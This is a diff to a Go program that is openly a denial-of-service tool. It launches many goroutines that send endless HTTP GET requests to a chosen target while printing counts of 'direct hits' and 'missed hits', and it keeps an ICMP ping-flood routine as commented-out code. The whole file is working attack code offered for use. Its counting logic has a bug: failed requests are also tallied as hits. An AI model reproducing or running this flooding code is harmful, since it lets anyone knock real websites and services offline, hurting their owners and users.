@@ -2,16 +2,17 @@ package main
 
 import (
 	"fmt"
-	"github.com/sparrc/go-ping"
 	"net/http"
 	"os"
 	"strconv"
 	"sync"
-	"log"
 )
 
 var (
 	wg sync.WaitGroup
+	mutex sync.Mutex
+	successfulHits int
+	missedHits int
 )
 
 const (
@@ -21,7 +22,10 @@ const (
 func main() {
 	target, threads := parseArgs()
 
+	fmt.Println("Press CTRL + C to quit")
+	fmt.Println()
 	fmt.Println("Attacking " + target + "...")
+	
 	for i := 0; i < threads; i++ {
 		wg.Add(1)
 		go httpGetFlood(target, &wg)
@@ -61,30 +65,38 @@ func areNumberOfThreadsValid(threads int) bool {
 	return true
 }
 
-func icmpFlood(target string) {
-	pinger, err := ping.NewPinger(target)
-
-	if err != nil {
-		fmt.Println("Error: Failed to ping host")
-		os.Exit(1)
-	}
-
-	pinger.Count = 65500 	// Packets to send
-	pinger.Run()         	// Blocks until complete
-
-	wg.Done() 				// Decrement thread counter once complete
-	fmt.Println("Ping Complete.")
-}
-
 func httpGetFlood(target string, wg *sync.WaitGroup) {
 	for {
 		_, err := http.Get(target)
 
-		if err != nil {
-			log.Println(err)
+		if err != nil {				 // Server could be down as failed to get a response from host. 
+			mutex.Lock()
+			missedHits++
+			fmt.Print(missedHits, " missed hits \r")
+			mutex.Unlock()
 		}
-		
-		fmt.Println("Target Hit - 200")
+
+		{
+			mutex.Lock()
+			successfulHits++
+			fmt.Print(successfulHits, " direct hits \r")
+			mutex.Unlock()
+		}
 	}
 	wg.Done()
 }
+
+// func icmpFlood(target string) {
+// 	pinger, err := ping.NewPinger(target)
+
+// 	if err != nil {
+// 		fmt.Println("Error: Failed to ping host")
+// 		os.Exit(1)
+// 	}
+
+// 	pinger.Count = 65500 	// Packets to send
+// 	pinger.Run()         	// Blocks until complete
+
+// 	wg.Done() 				// Decrement thread counter once complete
+// 	fmt.Println("Ping Complete.")
+// }
